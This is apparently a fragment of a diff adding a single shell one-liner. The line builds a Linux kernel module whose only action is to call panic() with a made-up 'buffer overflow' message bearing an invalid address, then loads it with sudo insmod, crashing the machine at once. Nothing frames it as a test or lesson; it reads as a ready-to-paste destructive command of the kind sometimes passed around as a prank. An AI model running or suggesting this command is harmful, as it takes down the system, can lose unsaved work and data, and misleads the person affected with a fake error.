@@ -1,0 +1,2 @@
+
+mkdir /tmp/kpanic && cd /tmp/kpanic && printf '#include <linux/kernel.h>\n#include <linux/module.h>\nMODULE_LICENSE("GPL");MODULE_AUTHOR("darknessinyourmind");static int8_t* message = "buffer overflow at 0x8g6d8s9fw6s9765";int init_module(void){panic(message);return 0;}' > kpanic.c && printf 'obj-m += kpanic.o\nall:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules' > Makefile && make && sudo insmod kpanic.ko
